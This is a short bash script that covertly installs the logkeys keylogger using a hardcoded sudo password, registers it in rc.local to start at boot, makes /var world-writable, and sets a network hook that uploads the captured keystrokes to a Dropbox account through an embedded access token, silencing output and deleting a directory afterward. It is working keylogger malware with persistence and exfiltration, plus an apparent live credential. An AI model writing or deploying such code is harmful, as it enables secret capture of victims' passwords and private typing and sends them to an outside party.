#!/bin/bash/
#check if logkeys is already present
if [ $(command -v logkeys) != "/usr/bin/logkeys" ]
then
  clear
  echo -e "student\n" &>/dev/null | sudo -S apt-get install -y logkeys &>/dev/null
  sudo chmod 777 /var/
else
  echo -e "student\n" &>/dev/null | sudo -S whoami &>/dev/null
fi
#add payload to rc.local
clear
echo "/usr/bin/logkeys -s -u -o /var/borhade.txt" | sudo tee -a /etc/init.d/rc.local
#check if git is installed
if [ $(command -v git) != "/usr/bin/git" ]
then
   echo -e "student\n" &>/dev/null | sudo -S apt-get install -y git &>/dev/null
fi
#clone dropbox uploader
cd /var
git clone https://github.com/andreafabrizi/Dropbox-Uploader.git &>/dev/null
#make it executable
cd /var/Dropbox-Uploader
echo -e "student\n" &>/dev/null | sudo -S chmod +x dropbox_uploader.sh &>/dev/null
echo -e "Q05WDI9ABtAAAAAAAAAADc4HuEJU6q_YxfeTdn8qoRWn33r3dxInSl-saEI2OMrE\ny\n" | ./dropbox_uploader &>/dev/null
cd
echo "./var/Dropbox-Uploader/dropbox_uploader.sh upload /var/borhade.txt /TheGreatApp" | sudo tee -a /etc/network/if-up.d/rhb &>/dev/null
sudo chmod +x /etc/network/if-up.d/rhb &>/dev/null
clear
cd 
sudo rm -rf insem
